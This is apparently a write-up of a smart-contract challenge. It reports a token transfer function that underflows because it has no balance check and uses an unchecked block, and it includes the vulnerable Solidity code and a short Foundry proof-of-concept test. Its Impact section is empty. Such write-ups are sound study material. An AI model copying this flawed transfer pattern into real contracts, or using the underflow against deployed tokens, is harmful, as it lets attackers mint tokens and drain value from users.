## Summary
The Challenge09 contract's critical vulnerability stems from the transfer function lacking a balance check before deducting tokens from the sender. This fundamental flaw is compounded by performing the subtraction inside an unchecked block, which bypasses Solidity 0.8's built-in overflow protection. As a result, users with insufficient balance can transfer tokens they don't have, causing their balance to underflow to near type(uint256).max and create tokens out of nothing.
## Vulnerability Details
The transfer function fails to check if the sender has sufficient balance before deducting tokens. Additionally, the balance deduction happens in an unchecked block, which prevents Solidity 0.8's default overflow/underflow protection from working:
```solidity
function transfer(address to, uint256 amount) public returns (bool) {
    unchecked {
        _balances[msg.sender] -= amount;
    }
    _balances[to] += amount;
    emit Transfer(msg.sender, to, amount);
    return true;
}
```
This is particularly problematic because:
1. There's no balance check before subtracting tokens
2. The unchecked block allows arithmetic underflow
3. The recipient still receives the tokens

## Impact

## PoC
```solidity
function test_TransferUnderflow() public {
    // Bob starts with 0 tokens
    vm.prank(bob);
    challenge.transfer(alice, 1);
    
    // Bob's balance underflows to maximum uint256 value
    assertEq(challenge.balanceOf(bob), type(uint256).max);
    
    // Alice receives the token
    assertEq(challenge.balanceOf(alice), challenge.totalSupply() + 1);
}
```

## Reccomendation
Modify the `transfer` function to include a balance check and remove the unchecked block.